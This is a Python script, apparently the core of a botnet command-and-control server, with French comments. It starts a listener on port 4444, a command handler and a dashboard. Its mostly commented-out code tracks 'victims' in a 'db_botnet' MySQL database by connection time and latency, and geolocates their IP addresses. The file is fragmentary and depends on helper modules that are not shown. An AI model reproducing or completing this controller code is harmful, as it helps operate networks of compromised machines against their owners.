from utils.general import *
from utils.webserver import *

####### INIT GLOBALS ##########

# {"command": "ps",
#   "args": {
#     "args": [],
#     "otp": "",
#     "url": ""
    
#   }
# }

banner()
################################


##### FUNCTION FOR PRINTING ASYNCHRONOUS ###### VOID


# async def pmsg(message, escape=True):
#     global focus, focus_str
#     # Effacer la ligne actuelle (où se trouve le curseur d'input)
#     if escape:

#         print(f"\r{message}\n{focus_str}> ", end="", flush=True)
#     else:
#         print(f"\r{message}{focus_str}> ", end="", flush=True)
#################################################


#### MYSQL CONNECTION ####

###########################





#### GET COUNTRY FROM IPV4 ##### VOID
# async def get_ip_country(ipv4):
#     id = len(clients) -1
#     req = requests.get(f'http://ip-api.com/json/{ipv4}')
#     res = req.json()
#     print(res)
#     clients[id]["country"] = "FR"
################################
    


#### GENERATE CLIENT (STORE ITS INSTANCE'S INFOS) ####

#######################################################

##### WEB SERVER ######################################
# async def api_dashboard(request):
#     try:
#         conn = mysql.connector.connect(user='root', password='',
#                                     host='127.0.0.1',
#                                     database='db_botnet')
#     except mysql.connector.errors:
#         print("[X] ERROR: Can't connect to db! exiting....")
#         exit()
    
#     curs = conn.cursor()
#     curs.execute("SELECT * FROM tasks WHERE task_status = 1")
    
#     rows = curs.fetchall()
#     taskNbr = len(rows)
    
#     curs.execute('''SELECT id
#                     FROM victims
#                     WHERE first_connection >= NOW() - INTERVAL 1 DAY;''')
    
#     rows = curs.fetchall()
#     lastVics = len(rows) 

#     curs = conn.cursor()
#     curs.execute('''SELECT latency_ms FROM victims WHERE status LIKE "connected";''')
#     rows = curs.fetchall()
#     sumLatency = 0
#     print(rows[0][0])
#     for x in rows[0]:
#         sumLatency += x
#     avgLatency = round(sumLatency / len(rows[0]))
#     avgLatency = f"{avgLatency}ms"

#     curs = conn.cursor()
#     curs.execute("SELECT id FROM interface_servers WHERE status = 1")
    
#     rows = curs.fetchall()
#     intServ = len(rows)

#     data = {
#         "taskNbr" : taskNbr,
#         "lastVics" : lastVics,
#         "avgLatency" : avgLatency,
#         "intServ": intServ
#     }


#     jsonData = json.dumps(data, separators=(',', ':'))

#     conn.close()
#     return aiohttp.web.Response(status=200, body=jsonData, content_type="text/json")






# async def handle_request(request):
#     # Récupère le chemin de la requête
#     rel_path = request.match_info['path']
#     # Le chemin du répertoire webserver
#     webserver_path = pathlib.Path(__file__).parent / 'webserver'
#     # Le chemin absolu de la ressource demandée
#     resource_path = webserver_path / rel_path

#     # Sécurité de base pour éviter le traversal de répertoires
#     if '..' in rel_path or resource_path.is_dir() or not resource_path.exists():
#         return aiohttp.web.Response(status=404, text='404: File not found')

#     content_type = 'text/html'  # Par défaut, suppose que c'est du HTML
#     if resource_path.suffix in ['.css']:
#         content_type = 'text/css'
#     elif resource_path.suffix in ['.js']:
#         content_type = 'application/javascript'
#     elif resource_path.suffix in ['.jpg', '.jpeg', '.png', '.gif']:
#         content_type = 'image/' + resource_path.suffix.replace('.', '')

#     content = resource_path.read_bytes()
#     return aiohttp.web.Response(body=content, content_type=content_type)

# async def web_server():
#     app = aiohttp.web.Application()
    
#     app.router.add_get('/api/getDashboard', api_dashboard)
#     app.router.add_get('/{path:.*}', handle_request)
    
    
#     # Run the web server on localhost and port 8080
#     runner = aiohttp.web.AppRunner(app)
#     await runner.setup()
#     site = aiohttp.web.TCPSite(runner, 'localhost', 8080)
#     await site.start()
#     await pmsg("[v] Web server started on http://localhost:8080")

###############################################################



    
    # try:
    #     while True:
    #         data = await reader.read(1024)  # Taille de buffer ajustable selon les besoins
    #         if not data:
    #             # Aucune donnée reçue signifie que le client a fermé la connexion
    #             await pmsg(f"Connection closed by {client_info}")
    #             break
    #         await messages_queue.put(data)
    #         message = data.decode()
    #         await pmsg(f"Received from {sid}: {message}")

    #         # Ici, vous pouvez ajouter une logique pour répondre aux messages des clients si nécessaire

    # except asyncio.CancelledError:
    #     # Gérer ici une annulation de tâche si nécessaire
    #     pass
    # finally:
    #     await pmsg(f"Closing connection with {client_info}")
    #     writer.close()
    #     await writer.wait_closed()
    #     del clients[sid]  
    # req = None

async def run_serv():
    print("[i] Starting server")
    server = await asyncio.start_server(handle_client, '127.0.0.1', PORT)
    server_task = asyncio.create_task(server.serve_forever())
    print("[v] Server started, listenning on port 4444")

    commands_task = asyncio.create_task(handle_commands())

   
    process_messages_task = asyncio.create_task(process_msg())

    web_server_task = asyncio.create_task(web_server())

    try:
       
        await asyncio.gather(server_task, commands_task, process_messages_task)
    except asyncio.CancelledError:
        print("Une tâche a été annulée")
    finally:
        print("Server shutdown.")
        



asyncio.run(run_serv())

